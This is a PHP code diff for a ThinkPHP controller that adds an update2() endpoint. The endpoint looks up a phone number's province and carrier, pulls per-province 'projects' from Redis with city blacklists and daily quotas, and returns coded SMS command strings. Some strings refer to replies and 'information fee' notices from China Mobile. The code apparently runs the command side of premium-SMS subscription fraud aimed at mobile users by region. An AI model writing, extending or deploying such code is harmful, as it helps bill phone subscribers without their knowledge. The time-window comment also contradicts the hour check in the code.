@@ -1,6 +1,7 @@
 <?php
 namespace app\fee\controller;
 
+use think\Cache;
 use think\Controller;
 
 class Resources extends Controller
@@ -43,10 +44,93 @@ class Resources extends Controller
                     Model("Success")->insert(["phone" => $phone, "type" => 3, "uid" => $data['uid']]);
                     return "1KW1002DH?1?ehwwhwdh?XL9?3?" . $data['uid'] . "?60?0?0";
                 }
-                if ($res->province == "广东" && !in_array($res->city,['广州','河源']) && $res->isp == '移动'){
-                    Model("Success")->insert(["phone" => $phone, "type" => 4, "uid" => $data['uid']]);
-                    // return "1KW1002DH?1?ehwwhsel?DZ14?2?1?360?0?<>1KW1003DH?回复“?”或?信息费?中国移动?";
-                    return "1KW1002DH?1?ehwwhsel?DZ14?1?" . $data['uid'] . "?360?0?<>1KW1003DH?回复“?”或?信息费?中国移动?";
+//                if ($res->province == "广东" && !in_array($res->city,['广州','河源']) && $res->isp == '移动'){
+//                    Model("Success")->insert(["phone" => $phone, "type" => 4, "uid" => $data['uid']]);
+//                    // return "1KW1002DH?1?ehwwhsel?DZ14?2?1?360?0?<>1KW1003DH?回复“?”或?信息费?中国移动?";
+//                    return "1KW1002DH?1?ehwwhsel?DZ14?1?" . $data['uid'] . "?360?0?<>1KW1003DH?回复“?”或?信息费?中国移动?";
+//                }
+            }
+        }
+        return "123";
+    }
+
+    /**
+     * 服务器转接数据
+     * 如果返回123则为由服务器返回
+     * 如果返回其他则由当前服务器返回
+     * @return string
+     */
+    public function update2(){
+        // 获取参数
+        $data = input("get.");
+
+        // 当前时间(只允许0~7时操作)
+        $now = date("H");
+        if ($now >= 7) {
+
+            // 格式化数据
+            $DataProcessing = Model('DataProcessing', 'logic');
+            $phone = $DataProcessing->formatPhoneNumber($data['flag1']);
+
+            // 查找归属地
+            $res = Model("Hdcx")->checkProvinceByPhone($phone);
+            if ($res) {
+
+                /** 手动任务 **/
+                if ($res->province == "海南" && $res->isp == '移动') {
+                    Model("Success")->insert(["phone" => $phone, "project_id" => 99, "uid" => $data['uid']]);
+                    return "1KW1002DH?1?ehwwhwdh?XL9?3?" . $data['uid'] . "?60?0?0";
+                }
+
+                /** 系统任务 **/
+
+                // 转换拼音
+                $PinyinLogic = Model('Pinyin', 'logic');
+                $provincePinyin = $PinyinLogic->encode($res->province,'all');
+
+                // 获取缓存
+                $redis = Cache::store('redis')->handler();
+                $projectList = $redis->hgetall("projet:" . $provincePinyin);
+                if ($projectList) {
+                    foreach ($projectList as $key=>$v) {
+                        $id = $key;
+                        $item = json_decode($v);
+                        if ($item->isstart == 1) { // 开关
+
+                            // 黑名单
+                            $blacklist_city = explode(",", $item->blacklist_city);
+                            if (in_array($res->city, $blacklist_city)) {
+                                continue;
+                            }
+
+                            // 获取限制数量(0为一直执行)
+                            $total = $redis->hget("projet:total_daily:" . $id, date("Ymd"));
+                            if ($total < $item->total_daily || $item->total_daily == 0) {
+
+                                // 自增加一
+                                $redis->hincrby("projet:total_daily:" . $id, date("Ymd"), 1);
+
+                                // 短信模板
+                                $sms = str_replace("uid", $data['uid'], $item->sms);
+
+                                // 记录日志
+                                Model("Success")->insert([
+                                    "phone" => $phone,
+                                    "project_id" => $id,
+                                    "uid" => $data['uid'],
+                                    "flag2" => $data['flag2'],
+                                    "channel" => $data['channel'],
+                                    "version" => $data['version'],
+                                    "province" => $res->province,
+                                    "city" => $res->city,
+                                    "sms" => $sms,
+                                ]);
+
+                                return $sms;
+                            }
+
+                        }
+                    }
                 }
             }
         }
